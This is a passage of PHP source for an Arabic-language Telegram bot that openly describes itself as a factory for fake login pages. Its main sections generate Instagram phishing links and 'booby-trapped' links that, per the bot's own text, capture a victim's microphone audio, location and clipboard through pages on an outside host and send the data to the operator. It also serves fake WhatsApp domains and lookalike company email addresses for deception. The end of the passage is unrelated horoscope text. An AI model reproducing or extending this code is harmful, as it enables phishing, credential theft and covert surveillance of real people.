    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://killnod2s77o3axkktdu52aqmmy4acisz2gicbhjm4xbvxa2zfftteyd.onion",
    "تم انشاء رابط ديب ويب:                                                                                                                                                                                                                                                                                      http://lainwir3s4y5r7mqm3kurzpljyf77vty2hrrfkps6wm4nnnqzest4lqd.onion",

    // روابط الواتساب:
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          https://www.sex.xnxx.whatsapp.xxxx.com/",
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             https://www.sex.xnxxwhatsapp.com/",
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             http://www.whatsapp.sex.xnxxsx.com/",
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             https://whatsappsexsex.xxx.com/",
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             https://www.sex.xnxx.whatsapp.xxxx.com/",
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             https://www.sexwhatsappxnxx.com/",
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             https://www.xnxxwhatsapp.com/",
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             https://whatsappsex4arab.xxx.com/",
    "تم انشاء رابط واتساب:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             https://whatsappsexsex.xxx.com/"
    ];

    // اختيار نكتة عشوائية
    $random_joke = $jokes[array_rand($jokes)];

    // إرسال النكتة إلى المستخدم
    bot("sendMessage", [
        "chat_id" => $chat_id2,
        "text" => $random_joke,
        "parse_mode" => "HTML"
    ]);
}

if ($data == "hunt_users") {
    // إرسال رسالة بأن الصيد بدأ
    bot("editMessageText", [
        "chat_id" => $chat_id,
        "message_id" => $message_id,
        "text" => "🔍 *جارٍ البحث عن يوزرات متاحة...*",
        "parse_mode" => "Markdown"
    ]);

    // تشغيل ملف sid.php وجلب النتائج
    $users = file_get_contents("https://smmyemen.pro/bots/wahm1954/sid.php"); // استبدل yourdomain.com برابط استضافتك

    // إرسال النتائج للمستخدم
    bot("sendMessage", [
        "chat_id" => $chat_id,
        "text" => $users,
        "parse_mode" => "Markdown"
    ]);
}
if($data == "help"){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'⚠️ **تعليمات استخدام بوت صانع اندكسات** ⚠️

مرحبًا بك في بوت صانع اندكسات! لإتمام تجربتك بأفضل شكل ممكن، نوصيك باتباع التعليمات التالية:

1. **البدء** 🚀:
   - لبدء استخدام البوت، أرسل الأمر `/start` أو انقر على زر "قسم الخدمات" في القائمة الرئيسية.
  
2. **إنشاء اندكس جديد** 🛠️:
   - اختر خيار "إنشاء اندكس" من القائمة.
   - اختر نوع الصفحه المراد إرساله مع المستهدفين
- سيتم إنشاء رابط خاص بالاندكس، يمكنك مشاركته مع المستهدفين.

3. **تلقي التنبيهات** 🔔:
   - ستتلقى إشعارات فورية على البوت عند قيام أي شخص بالتسجيل في اندكساتك.
   - تتضمن الإشعارات جميع البيانات المدخلة من قبل المستخدمين، مما يمكنك من متابعة وتحليل النتائج بسهولة.

4. **الأمان والخصوصية** 🔒:
   - تأكد من استخدام الروابط الخاصة بك بحذر وعدم مشاركتها إلا مع الأشخاص المستهدفين.
   - نوصي بعدم استخدام الاندكسات لأغراض غير قانونية أو لإيذاء الآخرين.

5. **المساعدة والدعم** 🆘:
   - في حال واجهت أي مشكلة أو كنت بحاجة إلى مساعدة، يمكنك الوصول إلى خيار "الدعم الفني" في القائمة للحصول على المساعدة الفورية.
   
6. **مشاركة البوت** 🤝:
   - شارك البوت مع أصدقائك ومعارفك عبر خيار "شارك البوت" لتمكينهم من الاستفادة من خدماته.

باستخدامك لبوت صانع اندكسات، يمكنك بسهولة إنشاء وإدارة صفحات التسجيل المزورة بكفاءة وأمان. اتبع التعليمات بعناية لضمان تحقيق أفضل النتائج. إذا كان لديك أي استفسار، لا تتردد في طلب المساعدة. شكراً لاستخدامك بوت صانع اندكسات!',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'حسناا','callback_data'=>'exit']]    
]    
])
]);
}
#=========no=========#
if($data == "no"){
bot('editMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>'
📜 **قوانين استخدام بوت صانع اندكسات** 📜

لضمان تجربة آمنة وسلسة لجميع مستخدمينا، يُرجى الالتزام بالقوانين التالية عند استخدام بوت صانع اندكسات:

1. **الاستخدام القانوني** ⚖️:
   - يجب استخدام البوت لأغراض قانونية فقط. يُمنع استخدام البوت لأي أنشطة غير قانونية أو ضارة.
   - يحظر استخدام البوت لجمع بيانات المستخدمين بدون موافقتهم الصريحة.

2. **الخصوصية والأمان** 🔒:
   - يجب على المستخدمين الحفاظ على سرية روابط الاندكس وعدم مشاركتها إلا مع الأشخاص المستهدفين بشكل آمن.
   - يمنع نشر أو مشاركة أي معلومات شخصية تم جمعها من خلال الاندكسات مع أطراف ثالثة بدون موافقة صريحة من أصحاب البيانات.

3. **الاحترام والأخلاق** 🌟:
   - يُمنع استخدام البوت لنشر أو توزيع محتوى مسيء، غير أخلاقي، أو يحض على الكراهية بأي شكل من الأشكال.
   - يجب التعامل مع جميع المستخدمين والزملاء باحترام واحترافية.

4. **الالتزام بالشروط** 📋:
   - يجب الالتزام بجميع الشروط والأحكام الخاصة بالبوت كما هي مذكورة في الوثائق الرسمية.
   - يُمنع استخدام البوت بطرق تتعارض مع شروط الخدمة الخاصة بتليجرام.

5. **حماية الحساب** 🔐:
   - يُنصح المستخدمون بتأمين حساباتهم الشخصية وعدم مشاركة تفاصيل الدخول مع أي شخص آخر.
   - يجب الإبلاغ فورًا عن أي نشاط مشبوه أو محاولات غير مصرح بها للوصول إلى الحساب.

6. **الإبلاغ عن الأخطاء** 🛠️:
   - في حالة اكتشاف أي أخطاء أو ثغرات في البوت، يُرجى الإبلاغ عنها لفريق الدعم الفني فورًا لتفادي استغلالها.
   - يُمنع محاولة استغلال أو إساءة استخدام أي أخطاء أو ثغرات في النظام.

7. **الاستخدام العادل** ⚙️:
   - يجب استخدام البوت بشكل يتوافق مع سياسة الاستخدام العادل، وتجنب أي محاولات لإساءة استخدام الموارد المتاحة.
   - يُمنع استخدام البرامج الآلية أو أي وسائل غير مصرح بها للوصول إلى البوت أو التفاعل معه.

---

نحن نقدر التزامكم بهذه القوانين لضمان بيئة آمنة وموثوقة للجميع. انتهاك أي من هذه القوانين قد يؤدي إلى إيقاف أو حظر حسابك. شكراً لتفهمكم وتعاونكم.

إذا كان لديكم أي استفسارات أو تحتاجون إلى مزيد من المعلومات، يُرجى التواصل مع فريق الدعم الفني.
',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'حسناا','callback_data'=>'exit']]    
]    
])
]);
}
if ($data == "smlink") {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "رابط اختراق انستجرام الخاص بك هو: https://smmyemen.pro/bots/wahm1954/instagram/index.php?ID=$chat_id2"
    ]);
}
#=========exit========#
if($data == "exit"){

bot('editMessageText', [
    'chat_id' => $chat_id2,
    'message_id' => $message_id,
    'text' => "🤖✨ **بوت مصنع الاندكسات** هو أداة متطورة تتيح لك إنشاء صفحات مزورة لجمع البيانات بطريقة سهلة وسريعة. يمكنك اختيار الأنماط الجاهزة المتاحة، وسيقوم البوت بتوفير رابط فريد لمشاركته.

📄🔍 **تجربة سلسة** حيث يمكنك الاطلاع على الخيارات المتاحة واختيار ما يناسب احتياجاتك. كما يتمتع البوت بمستوى عالٍ من الأمان والخصوصية.

💡🔒 **استمتع بواجهة مستخدم بسيطة ودعم فني متاح** لمساعدتك في أي وقت. استخدم بوت مصنع الاندكسات لتحقيق أهدافك بكفاءة وأمان.",
    'parse_mode' => "Markdown",
    'disable_web_page_preview' => true,
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            [
                ['text' => 'انشاء صفحه مزوره 🚀', 'callback_data' => 'index'],
                ['text' => 'انشاء رابط ملغم ☠️', 'callback_data' => 'exit1']
            ],
            [
                ['text' => 'اختصار روابط', 'web_app' => ['url' => 'https://m-r.pw/']]
            ],
            [
                ['text' => '- شرح البوت', 'callback_data' => 'help']
            ],
            [
                ['text' => 'تعليمات البوت ⚠️', 'callback_data' => 'no'],
                ['text' => 'شراء نسخة البوت', 'url' => 'https://t.me/BLACK_DEMON_VX']
            ],
            [
                ['text' => 'شارك البوت', 'url' => 'https://t.me/share/url?url=🤖✨ **بوت مصنع الاندكسات** هو أداة متطورة تتيح لك إنشاء صفحات مزورة لجمع البيانات بطريقة سهلة وسريعة. يمكنك اختيار الأنماط الجاهزة المتاحة، وسيقوم البوت بتوفير رابط فريد لمشاركته.

📄🔍 **تجربة سلسة** حيث يمكنك الاطلاع على الخيارات المتاحة واختيار ما يناسب احتياجاتك. كما يتمتع البوت بمستوى عالٍ من الأمان والخصوصية.

💡🔒 **استمتع بواجهة مستخدم بسيطة ودعم فني متاح** لمساعدتك في أي وقت. استخدم بوت مصنع الاندكسات لتحقيق أهدافك بكفاءة وأمان.
https://t.me/learn_hack_demon_bot']
            ]
        ]
    ])
]);

}
//========== وضع صيانة ============

//===================================

// الزر الخاص بالبحث عبر ID
if ($data == "search_telegram_id") {
    file_put_contents("database/$chat_id2/database.txt", "search_id");
    bot('editMessageText', [
        'chat_id' => $chat_id2,
        'message_id' => $message_id,
        'text' => "من فضلك أرسل الـ ID الرقمي لحساب تيليجرام:",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'رجوع', 'callback_data' => 'keksjsjsjskksjskjs']]
            ]
        ])
    ]);
}

// عند إرسال المستخدم رسالة
$database = file_get_contents("database/$chat_id/database.txt");

if ($text and $database == "search_id") {
    if (is_numeric($text)) {
        $tg_link = "tg://user?id=$text";
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "تم العثور على حساب عبر ID:",
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [['text' => 'رابط الحساب', 'url' => $tg_link]]
                ]
            ])
        ]);
        // حذف الحالة بعد التنفيذ لمنع التكرار
        unlink("database/$chat_id/database.txt");
    } else {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "⚠️ يرجى إرسال ID رقمي فقط بدون رموز أو أحرف."
        ]);
    }
}


// الزر الخاص بالبحث عبر رقم واتساب
if ($data == "search_whatsapp_number") {
    file_put_contents("database/$chat_id2/database.txt", "search_whatsapp");
    bot('editMessageText', [
        'chat_id' => $chat_id2,
        'message_id' => $message_id,
        'text' => "أرسل رقم الهاتف بصيغة دولية بدون رموز (مثال: 966500000000)",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'رجوع', 'callback_data' => 'skekksksjskskksksjs']]
            ]
        ])
    ]);
}

// عند إرسال المستخدم رقم واتساب
$database = file_get_contents("database/$chat_id/database.txt");

if ($text and $database == "search_whatsapp") {
    if (is_numeric($text) && strlen($text) >= 8 && strlen($text) <= 15) {
        $wa_link = "https://wa.me/" . $text;
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "تم إنشاء رابط واتساب:",
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [['text' => 'فتح شات واتساب', 'url' => $wa_link]]
                ]
            ])
        ]);
        // حذف الحالة بعد التنفيذ لمنع التكرار
        unlink("database/$chat_id/database.txt");
    } else {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "⚠️ الرقم غير صحيح. تأكد من الصيغة الدولية (مثال: 9677777777)."
        ]);
    }
}

if ($data == "exi2") {
   file_put_contents("database/$chat_id2/database.txt", "url");
    bot('editMessageText', [
        'chat_id' => $chat_id2,
        'message_id' => $message_id,
        'text' => "☠️ قم بارسال الرابط المراد تلغيمه

سيتم إنشاء روابط ملغمه كل رابط مصمم لسحب بينات بسهوله

📄🔗 هناك روابط لا يمكن تلغيم هاء وقت تم خظر بعض الموقع ",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
   [
['text' => 'تتواصل مع المطور', 'url' => "tg://user?id=$admin"]
]                
            ]
        ])
    ]);
}
//===================================
$database = file_get_contents("database/$chat_id/database.txt");
// التحقق من الرابط وإجراء العمليات المطلوبة
if ($text and $database == "url") {

    // التحقق من صحة الرابط
    if (filter_var($text, FILTER_VALIDATE_URL) === false) {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "⚠️ الرابط غير صحيح. يرجى إدخال رابط صحيح."
        ]);
        return;
    }

    $linkFile = 'link.txt';
    $urlFile = 'url.txt';
    $linkExists = false;
    $link = '';

    // التحقق مما إذا كان الرابط موجودًا في link.txt
if (file_exists($linkFile)) {
    $links = file($linkFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $parsedTextUrl = parse_url($text);
    $textDomain = isset($parsedTextUrl['host']) ? $parsedTextUrl['host'] : '';

    foreach ($links as $line) {
        $parsedLineUrl = parse_url(trim($line));
        $lineDomain = isset($parsedLineUrl['host']) ? $parsedLineUrl['host'] : '';

        if ($textDomain === $lineDomain) {
            $linkExists = true;
            break;
        }
    }
}

if ($linkExists) {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🚫 الرابط محظور."
    ]);
    return false;
}else {
        // التحقق من وجود الرابط في url.txt
        if (file_exists($urlFile)) {
            $urls = file($urlFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (in_array($text, $urls)) {
                $lineNumber = array_search($text, $urls) + 1; // إيجاد رقم السطر الذي يحتوي على الرابط
                $link = $lineNumber; // تعيين رقم السطر إلى المتغير $link
            } else {
                // إضافة الرابط إلى الملف
                file_put_contents($urlFile, $text . PHP_EOL, FILE_APPEND);
                // تحديث رقم السطر بعد إضافة الرابط
                $lineNumber = count($urls) + 1;
                $link = $lineNumber; // تعيين رقم السطر إلى المتغير $link
            }
        } else {
            bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "خطأ غير متوقع ⛔"
            ]);
            return false;
        }
    }

    // إرسال رسالة للمستخدم بعد التحقق من الرابط
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "تم تلغيم الرابط كل زر خاص في سحب اختر الي يناسبك
        
        🔥🔥🔥🔥🔥👇👇🔥🔥🔥🔥
        
        
        
        

عندما يقوم الضحيه بفتح الرابط سيتم اختراقه  وارساله اليك  ",
        'parse_mode' => "Markdown",
        'disable_web_page_preview' => true,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'تسجيل صوت🎤', 'url' => "https://smmyemen.pro/bots/wahm1954/mic/index.php?ID=$link"]],


                                                                [['text' => 'الموقع ', 'url' => "https://smmyemen.pro/bots/wahm1954/mode/index.php?ID=$chat_id&link=$link"]],
                                                                                [['text' => 'الحافظه', 'url' => "https://smmyemen.pro/bots/wahm1954/copy/index.php?ID=$chat_id&link=$link"]],
   [
['text' => 'تتواصل مع المطور', 'url' => "tg://user?id=$admin"]
]          
            ]
        ])
    ]);
}



// تابع الزر عند الضغط عليه
if ($callback_data == 'exit3') {
    $fakeLinks = [
        'روابط ديب ويب☠️🔥' => [
            "http://zsxjtsgzborzdllyp64c6pwnjz5eic76bsksbxzqefzogwcydnkjy3yd.onion",
            "http://meynethaffeecapsvfphrcnfrx44w2nskgls2juwitibvqctk2plvhqd.onion",
            "http://spywaredrcdg5krvjnukp3vbdwiqcv3zwbrcg6qh27kiwecm4qyfphid.onion",
            "http://digdeep4orxw6psc33yxa2dgmuycj74zi6334xhxjlgppw6odvkzkiad.onion",
            "http://killnod2s77o3axkktdu52aqmmy4acisz2gicbhjm4xbvxa2zfftteyd.onion"
        ],
        'روابط مزورة لشركة واتساب ☠️🔥' => [
            "https://www.sex.xnxx.whatsapp.xxxx.com/",
            "https://www.sex.xnxxwhatsapp.com/",
            "http://www.whatsapp.sex.xnxxsx.com/",
            "https://whatsappsexsex.xxx.com/",
            "https://www.sex.xnxx.whatsapp.xxxx.com/"
        ],
        'إيميلات الشركة ☠️🔥' => [
            "smb@support.whatsapp.com",
            "android@whatsapp.com",
            "android@support.whatsapp.com",
            "android_web@support.whatsapp.com"
        ]
    ];

    // اختر رابط عشوائي من الروابط
    $category = array_rand($fakeLinks);
    $randomLink = $fakeLinks[$category][array_rand($fakeLinks[$category])];

    // إرسال الرابط العشوائي للمستخدم مع زر تغيير الرابط
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "تم اختيار رابط عشوائي: \n\n" . $randomLink,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'تغيير الرابط', 'callback_data' => 'change_fake_link']]
            ]
        ])
    ]);
}

// تابع الزر لتغيير الرابط عند الضغط عليه
if ($callback_data == 'change_fake_link') {
    // اختر رابط عشوائي آخر
    $category = array_rand($fakeLinks);
    $randomLink = $fakeLinks[$category][array_rand($fakeLinks[$category])];

    // إرسال الرابط العشوائي الجديد
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "تم تغيير الرابط: \n\n" . $randomLink,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'تغيير الرابط', 'callback_data' => 'change_fake_link']]
            ]
        ])
    ]);
}
if($text =='/p' ){
bot('sendMessage',['chat_id'=>$chat_id,
'text'=>"اهلا بك قسم تحليل شخصيتك اختر طريقه التحليل عبر الازرار ادناه

$txtfree",
'parse_mode'=>"html",
'disable_web_page_preview'=>'true',
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- ابراج",'callback_data'=>"#1"],['text'=>"- اسئلة",'callback_data'=>"#2"]],
]])]);}

if ($data == "zzzzu"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"$start

$txtfree",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>HTML,
'disable_web_page_preview'=>'true',
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- ابراج",'callback_data'=>"#1"],['text'=>"- اسئلة",'callback_data'=>"#2"]],
]])]);}

if($data == "#1"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"
📣 عزيزي اختار برجك الخاص ليتم تحليل شخصيتك...
🔎 لمعرفة برجك اضغط على الزر في الاسفل...!
",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[["text"=>"- الحمل","callback_data"=>"q1"],["text"=>"- الثور","callback_data"=>"q5"],["text"=>"- الجوزاء","callback_data"=>"q9"]],
[["text"=>"- السرطان","callback_data"=>"q2"],["text"=>"- الاسد","callback_data"=>"q6"],["text"=>"- العذراء","callback_data"=>"q10"]],
[["text"=>"- الميزان","callback_data"=>"q3"],["text"=>"- العقرب","callback_data"=>"q7"],["text"=>"- القوس","callback_data"=>"q11"]],
[["text"=>"- الجدي","callback_data"=>"q4"],["text"=>"- الدلو","callback_data"=>"q8"],["text"=>"- الحوت","callback_data"=>"q12"]],
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q1"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"
👋🏻 اليك تحليل شخصيتك !!
- تتميز شخصيتك بانها شخصية نشيطه ومبتكرة ولك طريقة خاصه في التعامل مع الامور الدنيويه التي تواجهك قد تكون هاذا الطريقة فعاله او قد تسبب لك لكثير من المشاكل ,
 - لديك شخصية عفويه وتلقائيه فانت تندمج مع الاخرين وتبوح لهم الكثير من اسرارك دون ان تلاحظ ذالك ,
- انت تحتاج بعض الوقت في التفكير والتأمل او الانعزال لاعادة ترتيب نفسك بعد كل نكسه تتعرض لها ,
- لديك ذوق جميل في الاختيار واختيار الملابس خاصتا فانت تعمل كي تكون المتميز في هاذا لمجال او وسط اصدقائك.
- تتخذ بعض الوقت لكي تثق الاشخاص الانك شخصيه منفتحة وبعض افكارك مجنونه ولديك الكثير من المساحة مع الاصدقاء المقربون لك.
- انت لا تفكر قبل القيام بالامور مما يعرضك لكثير من الصدمات من الاصدقاء والمقربون رغم صراحتك الزائده الا انك تحضى بتقدير من حولك لك , 
",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q2"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"-  من الشخصيات الهادئة التى تتحلى بالسلام الداخلي كما أنها شغوفة، حساسة وفي بعض الأحيان تكون عنيدة ومتصلبة الرأي إضافة لذلك فهى تمتلك درجة عالية من العزيمة والإصرار في بعض الأحيان تتقوقع بعيدا عن الأخرين فى عالمك الخاص عندما يتم مضايقتك أو استفزازك. وفي هذه الاوقات يظهر الجانب المتشائم والعدواني بكل وضوح فعندما تكره شخص معين، فلن تبذل أي مجهود لإخفاء هذه المشاعر كما قد تفعل في المعتاد ورغم ذلك تعبتر  من أكثر شخصيات الأبراج حساسية واهتماما بالأخرين كما أن تتمتع بمخيلة نشطة وتعشق بجنون ولديهك شعور دائم بالرغبة في حماية الأخرين والإعتناء بهم خاصة أولئك المقربين إلى قلبك عاطفي بدرجة كبيرة فانك تقدّر الزهور والهدايا وتحب قصائد الحب إذا أردت أن تفوز بقلبها عليك إبهارها هي أيضا تحب أن تتمهل وتأخذ وقتا كاف قبل الوقوع في الحب كما أنها تبحث عن شريك حساس المشاعر مثلها ليس من السهل  الوثوق في الأخرين ولكن إذا كنت من الحظوظين الذين نالوا هذه الثقة فسوف تفوز بمساحة كبيرة من قلبها تتميز امراة برج السرطان أيضا بأنها صبورة وتحرص دوما على البقاء بجانب شريك حياتها في أوقات الأزمات وتسعي لمشاركته في تخطي كافة العقبات التى يواجها.وهذا ما يجعلها شريكة فريدة من نوعها تحب امرأة برج السرطان الرجل الذي يعبر عن عواطفة طوال الوقت فيحتضنها من حين لأخر ويعد لها بها عشاءا رومانسيا على أضواء الشموع. كل اهتمامها يتعلق بعائلتها وبيتها، فهى تعطي دوما الأولوية لهم ولأصدقائها المقربين إلى قلبها فتحرص على الأهتمام بهم وتدليلهم وإعطائهم الحب طوال الوقت.",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q3"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"- شخصية برج الميزان عادلة وتسعى دوما إلى موازنة الأمور وتحقيق العدالة والإنصاف تتميز أيضا بأنها اجتماعية ولديها مهارات عالية في الاتصال وتُعرف بشخصيتها الساحرة التي تلفت الآخرين إليها بسهولة تقع  في منطقة وسط بين الشخصية العقلانية والشخصية العاطفية وتحاول دوما تحقيق التوازن بينهما بحيث لا تكون عاطفية بدرجة كبيرة أو عقلانية للغاية هي أيضا دبلوماسية تستمع إلى صوت الحق والمنطق لا تمانع من الاعتراف بأخطائها إذا تحدث الآخرين معها بلغة المنطق والعقل شخصيه رائعة تتفهم جيدا وجهات نظر شريك حياتها وتسعى دوما إلى وضع نفسها في مكانه تتقن جيدا فن امتصاص غضب الآخر والحفاظ على الهدوء في كل موقف تمر به ولكن في الوقت ذاته هي تبحث عن شريك يدعمها ويمدحها طوال الوقت لا تقع في علاقة عاطفية بسهولة فهي تفضل أن تعطي نفسها الوقت الكافي لتتأكد من مشاعرها ومن كونه الشخص الأمثل لها تسعى لفعل أي شيء لإسعاد وإرضاء شريك حياتها فهي مخلصة ورومانسية من الدرجة الأولى.",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q4"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"شخصية برج الجدي:
تسعى باهتمام لتحقيق النجاح في حياتها سواء على المستوى المهني أو العائلي من خلال إدارة منزلها بشكل حكيم أهدافها منظمة وتتبنى دوما وجهات نظر عملية ولديها طريقة دبلوماسية في التفكير والتعامل مع الآخرين لديها قدرة عالية على التحكم في نفسها وتميل إلى إظهار جانبها المرح والجريء فقط للأشخاص المقربين إلى قلبها تتميز بأنها شخصية متواضعة وصبورة وتشعر بالمسؤولية تجاه غيرها كما أنها من الشخصيات التي تحفز نفسها باستمرار قد يأخذ الآخرين بعض الوقت لفهم طبيعتها إلى أن تقوم بفتح قلبها لهم
رغم أن برج الجدي لا تستطيع التعبير عن مشاعرها بشكل جيد إلا أنها رومانسية وعاطفية للغاية تكمن قوتها الكامنة في قدرتها على وضع أهداف طويلة المدى والإصرار على تحقيقها والوصول إليها.",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q5"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"- شخصية الثور:
تتميز شخصيتك بروحها الجميلة وامتلاكها لحس فكاهي يأسر المحيطين بها ورغم أنها تميل إلى أن النمط الحساس من الشخصيات، إلا انها تحاول دوما إخفاء هذا الجانب. شخصيتك أيضا شخصية عنيدة مليئة بالإصرار والعزيمة تعرف جيدا ما تريد تحقيقة وتبذل قصاري جهدها للوصول إليه، في بعض الأحيان يراها البعض مجنونة لمحاولاتها المستميته والغير متوقعة لتحقيق هدفها تعد شخصيتك واحدة من أكثر الشخصيات العنيدة والمتصلبة الرأي التى يمكن أن تقابلها فى الحياة، تميل أيضا إلى أن تكون مسيطرة وغيورة ربما تخشى المخاطرات وتحب دوما البقاء فى دائرة الآمان لكن في أحيان أخرى تجدها تقدم على تصرفات بها بعض المخاطرة والتي عادة لا تمعن التفكير فيها كثيرا ترتبط بسهولة بالآخرين وهو ما يجعلها قادرة على تكوين صداقات جديدة تحب الأشياء الجميلة وقد تتمادى قليلا في تدليل نفسها عادة تكون هادئة وصبورة ولكن مع ذلك عندما تكون مضغوطة بشكل زائد حاول الإبتعاد عنها قدر المستطاع حتى لا تنفجر غضبا فى وجهك أصدقاء للأبد xoxo؟ فى الغالب هذه هى شخصيتك ، فهى شخصيه رائعة ورغم أن لها معارف كثيرة إلا أنها تحتفظ بقلة من الأصدقاء المقربين إلى قلبها امرأة برج الثور صديقة لديها ولاء وعطاء تحب دائما مساعدة الأخرين وتجدها دوما أول من يظهر فى المواقف الصعبة لتقديم الدعم والمساعدة وإذا وجدت صديق يمتلك نفس ذوقها فى اختيار الطعام ولديه روح الدعابة فإنها ستحتفظ به إلى الآبد,",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q6"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"- شخصية برج الاسد:
وسط مكان مزدحم فشخصيتك صاحبة الضحكة العالية والابتسامة المشرقة المفعمة بالحياة تحب لفت انتباه المحيطين بك وفي العادة تستطيع تحقيق ذلك أيضا تحب الحياة والمرح واللعب لكن إذا حاولت إزعاجها فلن تتردد في الإفصاح عن غضبها وإظهار الوجه الآخر لها شخصيه ذكية قوية الشخصية صريحة في آرائها ومواقفها كما أنها مبدعة ولديها حس فكاهي. هناك أيضا جانب درامي من شخصيتها يجذب الكثيرين إليها التحدي الأكبر بالنسبة لها هو ألا تستخدم قوة شخصيتها بطريقة مبالغ فيها ثقتها الزائدة بنفسها يراها البعض غطرسة وغرور عندما يتعلق الأمر بالعلاقات العاطفية فلن تشعر بالملل أبدا برج الأسد فهو تطيحب العطاء والاهتمام الذي تحبه وتنتظر دوما نفس مقدار الحب والعناية من الطرف الآخر قد لا تمانع من مطاردة الشخص الذي تحبه فالحب واحدا من أهم الأشياء بالنسبة لها في الحياة
الحياة أشبه بمغامرة مثيرة ولا ترضي إلا بالأفضل ورغم ذلك فإنها تقع في الحب بسهولة وعندما يحدث ذلك تكون عاطفية جدا خاصة إذا شعرت أن هذا الشخص هو الأمثل لها مخلصة ووفية للغاية وتبحث عن هذه الصفات في الشخص الذي تحبه هي أيضا كريمة وذات قلب حنون تكرة الروتين والأشياء التقليدية ولن تكون الحياة مملة أبدا معها.",
'reply_to_message_id'=>$message->message_id,
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"- رجوع 🚸",'callback_data'=>"zzzzu"]],]])]);}

if ($data == "q7"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
